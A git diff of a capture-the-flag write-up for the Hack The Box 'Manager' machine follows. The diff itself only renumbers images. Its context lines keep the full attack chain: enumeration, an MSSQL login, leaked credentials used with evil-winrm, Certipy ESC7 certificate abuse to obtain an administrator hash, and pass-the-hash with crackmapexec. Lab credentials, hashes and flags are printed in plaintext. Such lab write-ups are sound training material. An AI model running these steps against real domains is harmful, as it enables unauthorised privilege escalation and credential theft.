@@ -10,7 +10,7 @@ sudo nmap -T4 -Pn -sV -sC -v 10.129.74.218 -oA Manager
 
 \*\*Had to shutdown to IP changed to `10.129.74.218` for some later things
 
-<figure><img src="../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>
 
 ```nmap
 PORT     STATE SERVICE       VERSION
@@ -113,17 +113,17 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Not a lot to the website, no logon forms or any hidden directories
 
-<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>
 
 #### Dirbuster/Gobuster
 
-<figure><img src="../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>
 
 #### SMB
 
-<figure><img src="../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>
 
 Directories are empty, C$ and ADMIN$ we don't have access by default.
 
@@ -131,9 +131,9 @@ BUT we were able to find the users with CrackMapExec and trying various password
 
 &#x20;&#x20;
 
-<figure><img src="../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>
 
 ### RPC
 
@@ -154,11 +154,11 @@ Administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1
 
 Were able to log in with `Operator:operator`&#x20;
 
-<figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>
 
 Using xp\_dirtree to look around in various directories we eventually found:&#x20;
 
-<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (878).png" alt=""><figcaption></figcaption></figure>
 
 Grabbed the .zip file
 
@@ -166,11 +166,11 @@ Grabbed the .zip file
 http://10.129.75.78/website-backup-27-07-23-old.zip
 ```
 
-<figure><img src="../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>
 
 #### .old-conf.xml
 
-<figure><img src="../../.gitbook/assets/image (524).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (880).png" alt=""><figcaption></figcaption></figure>
 
 More user creds! We found `Raven@manager.htb:R4v3nBe5tD3veloP3r!123`
 
@@ -180,7 +180,7 @@ More user creds! We found `Raven@manager.htb:R4v3nBe5tD3veloP3r!123`
 evil-winrm -i 10.129.75.78 -u Raven -p 'R4v3nBe5tD3veloP3r!123'
 ```
 
-<figure><img src="../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (881).png" alt=""><figcaption></figcaption></figure>
 
 User flag was found under user.txt on Ravens desktop: `5ba4881af698a98cbf340a8861580333`
 
@@ -188,13 +188,13 @@ User flag was found under user.txt on Ravens desktop: `5ba4881af698a98cbf340a886
 
 Looked around at what permissions Raven had
 
-<figure><img src="../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (882).png" alt=""><figcaption></figcaption></figure>
 
 ### WinPEAS
 
-<figure><img src="../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>
 
 Nothing of super note was found with WinPeas unfortunately
 
@@ -202,7 +202,7 @@ Nothing of super note was found with WinPeas unfortunately
 
 We checked with Certipy due it being Active Directory and on a DC. So we want to enumerate certificates.
 
-<figure><img src="../../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 certipy-ad find -vulnerable -u raven@dc01.manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.139.52 -stdout
@@ -214,7 +214,7 @@ We see ESC7 is vulnerable - [On the certipy github on ESC7](https://github.com/l
 certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
 ```
 
-<figure><img src="../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>
 
 <pre class="language-bash"><code class="lang-bash"><strong>certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
 </strong></code></pre>
@@ -223,19 +223,19 @@ certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.h
 certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
 ```
 
-<figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 certipy-ad ca -ca 'manager-DC01-CA' -issue-request 17 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
 ```
 
-<figure><img src="../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (890).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 17
 ```
 
-<figure><img src="../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (891).png" alt=""><figcaption></figcaption></figure>
 
 We now have our administrator.pfx and we can use this.
 
@@ -243,7 +243,7 @@ We now have our administrator.pfx and we can use this.
 certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'manager.htb' -dc-ip 10.129.139.52
 ```
 
-<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>
 
 We need to sync our clock with the DC. We we can use rdate(need to install it) to get the time of the DC Server
 
@@ -252,7 +252,7 @@ sudo apt install -y rdate
 sudo rdate -n dc01.manager.htb
 ```
 
-<figure><img src="../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>
 
 Then use faketime to sync the clock
 
@@ -261,11 +261,11 @@ sudo apt install -y rdate
 sudo faketime -f '(date/time of dc)'/bin/date
 ```
 
-<figure><img src="../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>
 
 Re-run our certipy command and get the hash of the administrator!&#x20;
 
-<figure><img src="../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>
 
 Administrator NTLM hash: `aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef`
 
@@ -279,6 +279,6 @@ crackmapexec smb 10.129.139.52 -u Administrator -H aad3b435b51404eeaad3b435b5140
 crackmapexec smb 10.129.139.52 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -x 'type C:\Users\Administrator\Desktop\root.txt'
 ```
 
-<figure><img src="../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>
 
 Root.txt: `35891a19f5ad0f5c2fced375b3c7142e`
